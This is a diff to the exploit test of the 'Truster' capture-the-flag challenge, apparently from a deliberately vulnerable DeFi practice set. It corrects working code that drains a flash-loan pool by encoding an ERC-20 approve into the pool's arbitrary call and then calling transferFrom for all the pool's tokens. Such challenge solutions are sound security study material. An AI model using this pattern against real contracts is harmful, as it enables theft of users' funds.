@@ -33,19 +33,18 @@ describe("[Challenge] Truster", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE  */
-    // TODO: error
     const ABI = ["function approve(address spender, uint256 amount)"];
     const interface = new ethers.utils.Interface(ABI);
     const data = interface.encodeFunctionData("approve", [
-      attacker,
-      TOKENS_IN_POOL.toString(),
+      attacker.address,
+      TOKENS_IN_POOL,
     ]);
 
     /** flashLoan(borrow, amount, target, data) */
-    this.pool.flashLoan(0, attacker, this.token.address, data);
-    await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, {
-      from: attacker,
-    });
+    await this.pool.flashLoan(0, attacker.address, this.token.address, data);
+    await this.token
+      .connect(attacker)
+      .transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
   });
 
   after(async function () {
